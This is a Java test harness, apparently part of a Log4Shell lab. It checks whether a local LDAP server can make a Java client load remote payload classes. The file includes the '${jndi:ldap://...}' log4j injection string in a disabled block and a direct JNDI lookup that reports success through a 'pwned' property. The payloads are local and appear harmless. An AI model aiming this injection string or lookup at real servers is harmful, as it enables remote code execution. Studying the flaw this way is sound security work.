package itzbenz;

import org.apache.logging.log4j.Logger;

import javax.naming.NamingException;
import javax.naming.NoInitialContextException;
import javax.naming.directory.InitialDirContext;

public class LDAPTest {
    static final String defaultLookup = "ldap://localhost:10389/o=reference,payload=itzbenz.payload.Stdout";
    static boolean insideThread;

    //to test thing if LDAP server working
    public static void main(String[] args) {
        String lookup = defaultLookup;

        if (args.length > 0) {
            lookup = args[0];
        }

        boolean isDefaultLookup = lookup.equals(defaultLookup);
        InitialDirContext idc = null;
        //false positive check
        boolean found = false;
        if (isDefaultLookup) {
            try {
                Class<?> lel = Class.forName("itzbenz.payload.RickRoll", false, Thread.currentThread()
                        .getContextClassLoader());
                found = true;
            } catch (ClassNotFoundException ignored) {

            }
        }
        if (found) {
            if (insideThread) {
                throw new RuntimeException("payload exists in current classloader too, aborting");
            }
            System.err.println("payload already exists in current classloader, switching context");
            Thread t = new Thread(new Runnable() {
                @Override
                public void run() {
                    insideThread = true;
                    try {
                        main(new String[]{});
                    } catch (Throwable e) {
                        e.printStackTrace();
                    }
                }
            });
            t.setContextClassLoader(new ClassLoader() {
                @Override
                public Class<?> loadClass(String name) throws ClassNotFoundException {
                    if (name.startsWith("itzbenz.payload")) throw new ClassNotFoundException();
                    return super.loadClass(name);
                }

                @Override
                protected Class<?> findClass(String name) throws ClassNotFoundException {
                    if (name.startsWith("itzbenz.payload")) throw new ClassNotFoundException();
                    return super.findClass(name);
                }
            });
            t.start();
            return;
        }
        //this is somehow true in older java update
        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", String.valueOf(true));
        boolean trustURL = Boolean.parseBoolean(System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.ldap.object.trustURLCodebase: " + trustURL);
        System.out.println("Using lookup: " + lookup);
        System.out.println("Java Version: " + System.getProperty("java.version"));
        if (false) try {
            Logger logger = org.apache.logging.log4j.LogManager.getLogger();
            logger.error("Using log4j version: " + logger.getClass().getPackage().getImplementationVersion());
            logger.error("${jndi:" + lookup + "}");
            if (System.getProperty("pwned") != null){
                logger.error("Great success!");
            }else{
                logger.error("Fail");
            }
            return;
        } catch (Throwable e) {
            e.printStackTrace();
        }
        try {
            idc = new InitialDirContext();
            Object o = idc.lookup(lookup);
            System.out.println(o);
            System.out.println(o.getClass().getCanonicalName());
            if (System.getProperty("pwned") != null)
                System.out.println("Great Success!");
            else System.out.println("Fail");
        } catch (NoInitialContextException e) {
            System.err.println("The LDAP server not configured to be attack vector ?");
            System.err.println(e.getMessage());
        } catch (NamingException e) {
            System.err.println("Failed to lookup: " + e.getMessage());
            if (e.getMessage() == null && !trustURL) {
                System.err.println("Blocked by trustURL, probably not with log4j");
            } else {
                System.err.println("The LDAP server not configured to be attack vector ?");
            }
            System.err.println();
            e.printStackTrace();
        } catch (Exception e) {
            System.err.println("Failed to lookup");
            System.err.println();
            e.printStackTrace();
        }
    }
}
